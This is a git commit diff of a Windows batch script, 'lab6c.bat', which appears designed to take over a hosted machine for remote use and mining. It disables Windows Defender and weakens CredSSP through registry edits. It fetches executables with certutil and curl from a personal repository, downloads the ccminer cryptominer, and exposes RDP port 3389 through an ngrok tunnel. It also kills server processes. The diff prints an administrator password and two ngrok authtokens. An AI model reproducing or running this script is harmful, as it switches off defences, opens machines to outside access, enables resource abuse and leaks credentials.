c6be1da225ad1e675464acc884a3954e55f97628
adamzjefri <35675230+adamzjefri@users.noreply.github.com>
2021-02-06 21:10:19 +0700

    Update lab6c.bat

--- lab6c.bat
+++ lab6c.bat
@@ -1,4 +1,5 @@
-net user Administrator Thuonghai001
+
+
 tzutil /s "SE Asia Standard Time"
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters\ /v AllowEncryptionOracle /t REG_DWORD /d 2
@@ -10,14 +11,19 @@ certutil -urlcache -split -f https://raw.githubusercontent.com/adamzjefri/thuong
 certutil -urlcache -split -f https://raw.githubusercontent.com/adamzjefri/thuonghai/master/nircmd.exe
 curl -LJOk https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip
 7z x ngrok-stable-windows-amd64.zip
-ngrok authtoken 1YhyjW3lK2BEBeNul7lcR3QoS6C_22K9WY61ZdVnc2A27TSZf
-start ngrok tcp 3389
+
+
 cd C:\Users\Administrator\Desktop
 curl -LJOk https://raw.githubusercontent.com/adamzjefri/thuonghai/master/ChromeSetup.exe
 curl -LJOk https://raw.githubusercontent.com/adamzjefri/thuonghai/master/anti-close.bat
 curl -LJOk https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccminer_cpu3_7_SSE2.zip
 curl -LJOk https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v7.8.8/npp.7.8.8.Installer.exe
 start ChromeSetup.exe
+cls
+@echo off
+set /p id=1o5yFLHVNWorSiIyyS4nNG2LtxK_628YJzZUgxoEh3LcPvFtt
+ngrok authtoken %id%
+start ngrok tcp 3389
 start anti-close.bat
 net start audiosrv
 taskkill /f /im sqlservr.exe
@@ -25,4 +31,4 @@ taskkill /f /im Batch.exe
 taskkill /f /im w3wp.exe
 taskkill /f /im explorer.exe
 start explorer.exe
-start taskmgr.exe
+exit
